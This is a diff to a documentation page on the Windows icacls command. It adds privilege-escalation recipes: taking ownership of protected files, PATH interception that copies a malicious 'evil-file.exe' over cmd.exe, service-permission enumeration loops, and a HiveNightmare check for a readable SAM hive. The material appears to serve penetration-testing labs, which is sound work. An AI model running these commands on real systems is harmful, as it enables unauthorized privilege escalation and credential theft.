@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=icacls) · [All tools](/index)
+
 ## Inspect a file
 
 **Windows — cmd.exe**
@@ -31,8 +33,78 @@ F = full control, M = modify, RX = read/execute, W = write, (I) = inherited. Eva
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=icacls)
+## Notebook recipes
 
-## Learning and original examples
+4 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+<AccordionGroup>
+
+<Accordion title="D. SeTakeOwnership">
+
+### D. SeTakeOwnership
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+takeown /f C:\path\to\protected.file
+icacls C:\path\to\protected.file /grant %username%:F
+```
+
+</Accordion>
+
+<Accordion title="EoP - $PATH Interception">
+
+### EoP - $PATH Interception
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# List contents of the PATH environment variable
+# EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
+$env:Path
+
+# See permissions of the target folder
+# EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
+icacls.exe "C:\Program Files\nodejs\"
+
+# Place our evil-file in that folder.
+copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
+```
+
+</Accordion>
+
+<Accordion title="EoP - Incorrect permissions in services">
+
+### EoP - Incorrect permissions in services
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+```
+
+</Accordion>
+
+<Accordion title="HiveNightmare">
+
+### HiveNightmare
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+C:\Windows\System32> icacls config\SAM
+config\SAM BUILTIN\Administrators:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
+```
+
+</Accordion>
+
+</AccordionGroup>
